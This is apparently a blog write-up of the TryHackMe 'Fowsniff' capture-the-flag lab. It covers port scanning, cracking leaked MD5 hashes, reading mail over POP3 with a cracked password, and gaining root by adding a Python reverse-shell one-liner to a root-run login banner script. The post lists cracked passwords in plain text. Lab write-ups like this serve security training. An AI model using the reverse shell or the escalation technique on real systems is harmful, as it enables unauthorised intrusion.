---
layout: post
title:  "Tryhackme: Fowsniff CTF"
date:   2021-04-02 22:45:56 +0200
categories: tryhackme
---

## Nmap Scan ##

### Initial Port Scan ###
```
sudo nmap -sS -p- -Pn -T5 -vv 10.10.135.117
```
```
Nmap scan report for 10.10.135.117
Host is up, received user-set (0.063s latency).
Scanned at 2021-04-03 15:47:21 EDT for 111s
Not shown: 65531 closed ports
Reason: 65531 resets
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
110/tcp open  pop3    syn-ack ttl 63
143/tcp open  imap    syn-ack ttl 63
```
As usual, we have our web server on port 80 and the ssh server open on port 22. However, what is interesting is that we are also shown the ```pop3``` and ```imap``` protocols. This must mean that this challenge will have something to do with Emails.
### Targeted Port Scan ###
```
sudo nmap -sSCV -T5 -vv 10.10.135.117 -p22,80,110,143
```
```
Nmap scan report for 10.10.135.117
Host is up, received reset ttl 63 (0.065s latency).
Scanned at 2021-04-03 15:53:07 EDT for 18s

PORT    STATE SERVICE REASON         VERSION
22/tcp  open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsEu5DAulaUX38ePQyI/MzevdyvWR3AXyrddVqbu9exD/jVVKZopquTfkbNwS5ZkADUvggwHnjZiLdOZO378azuUfSp5geR9WQMeKR9xJe8swjKINBtwttFgP2GrG+7IO+WWpxBSGa8akgmLDPZHs2XXd6MXY9swqfjN9+eoLX8FKYVGmf5BKfRcg4ZHW8rQZAZwiMDqQLYechzRPnePiGCav99v0X5B8ehNCCuRTQkm9DhkAcxVBlkXKq1XuFgUBF9y+mVoa0tgtiPYC3lTOBgKuwVZwFMSGoQStiw4n7Dupa6NmBrLUMKTX1oYwmN0wnYVH2oDvwB3Y4n826Iymh
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPowlRdlwndVdJLnQjxm5YLEUTZZfjfZO7TCW1AaiEjkmNQPGf1o1+iKwQJOZ6rUUJglqG8h3UwddXw75eUx5WA=
|   256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHU5PslBhG8yY6H4dpum8qgwUn6wE3Yrojnu4I5q0eTd
80/tcp  open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
110/tcp open  pop3    syn-ack ttl 63 Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) USER PIPELINING RESP-CODES AUTH-RESP-CODE UIDL TOP CAPA
143/tcp open  imap    syn-ack ttl 63 Dovecot imapd
|_imap-capabilities: more post-login LOGIN-REFERRALS have IDLE AUTH=PLAINA0001 ENABLE listed ID capabilities IMAP4rev1 LITERAL+ Pre-login OK SASL-IR
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Directory Bruteforcing ##
```
gobuster dir -u http://10.10.135.117/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 16
```
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.135.117/
[+] Threads:        16
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/04/03 15:57:48 Starting gobuster
===============================================================
/images (Status: 301)
/assets (Status: 301)
/server-status (Status: 403)
===============================================================
2021/04/02 16:15:10 Finished
===============================================================
```

Unfortunately, there is nothing really interesting shown here. Let's move on to investigating the web server.

## Reconnaissance ##

![webserver](/assets/images/FowsniffCTF/webserver.png)

It looks like we are given a twitter account to investigate.

![twitter](/assets/images/FowsniffCTF/twitter.png)

Now we are redirected to a pastebin.

![pastebin](/assets/images/FowsniffCTF/pastebin.png)

It looks like we have a bunch of ```md5``` credentials to decrypt now.

## Hashcat Decryption ##

I am going to write the hashes into a file, and, using ```hashcat``` I will decrypt them.

```
hashcat -O -m 0 -a 3 /tmp/hashes /usr/share/wordlists/rockyou.txt --show
```

```
8a28a94a588a95b80163709ab4313aa4:mailcall
ae1644dac5b77c0cf51e0d26ad6d7e56:bilbo101
1dc352435fecca338acfd4be10984009:apples01
19f5af754c31f1e2651edde9250d69bb:skyler22
90dc16d47114aa13671c697fd506cf26:scoobydoo2
0e9588cb62f4b6f27e33d449e2ba0b3b:carp4ever
4d6e42f56e127803285a0a7649b5ab11:orlando12
f7fd98d380735e859f8b2ffbbede5a7e:07011972
```

Looks like one hash is missing... The one of ```stone@fowsniff``` to be more specific.

Let's put the found credentials to use.

## POP3 Enumeration ##

We are told to connect to the ```pop3``` service with seina's credentials.

```
$ nc 10.10.253.109 110         
+OK Welcome to the Fowsniff Corporate Mail Server!
user seina
+OK
pass scoobydoo2
+OK Logged in.
list
+OK 2 messages:
1 1622
2 1280
```

We can see there are two emails available. Let's check them out!

First one:

```
retr 1
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "??????????????"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone
```

Looks like this one gives us the temporary ```SSH``` password!

Second one:

```
retr 2
+OK 1280 octets
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
        id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.
```

This one gives nothing useful to us at this moment, except the username from where this email comes from, namely ```baksteen```. We are going to use this username to log in through ```SSH```.

## Setting Foothold ##

```
$ ssh baksteen@10.10.253.109                                                                                                                                                                   130 ⨯
baksteen@10.10.253.109's password: 

                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions


   ****  Welcome to the Fowsniff Corporate Server! **** 

              ---------- NOTICE: ----------

 * Due to the recent security breach, we are running on a very minimal system.
 * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.


Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36
```

Alright, we are in!

```
baksteen@fowsniff:~$ id
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
```

Interestingly, it seems that the ```users``` group is out of place here.

```
baksteen@fowsniff:~$ find / -group users 2>/dev/null
/opt/cube/cube.sh
...
```

Looks like this group own a shell script! Let's see what it does.

```
printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"
```

Ah! It's just the banner...

But we could run this as ```root```, since all the scripts that refer to the banner are run as ```root```:
```
baksteen@fowsniff:~$ ls /etc/update-motd.d/ -l
total 16
-rwxr-xr-x 1 root root 1248 Mar 11  2018 00-header
-rwxr-xr-x 1 root root 1473 Mar  9  2018 10-help-text
-rwxr-xr-x 1 root root  299 Jul 22  2016 91-release-upgrade
-rwxr-xr-x 1 root root  604 Nov  5  2017 99-esm
```

Let's add our python reverse shell into the previous script.

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((10.9.136.138, 1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Root flag ##

We will have to reconnect through ```SSH``` and put a ```netcat``` listener on port ```1234``` to wait for the reverse shell to pop.

In one terminal I am going to reconnect:

```
$ ssh baksteen@10.10.253.109
```

And in my listener's terminal I will receive a shell as root!

```
$ nc -nlvp 1234          
listening on [any] 1234 ...
connect to [10.9.136.138] from (UNKNOWN) [10.10.253.109] 35808
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/flag.txt
```
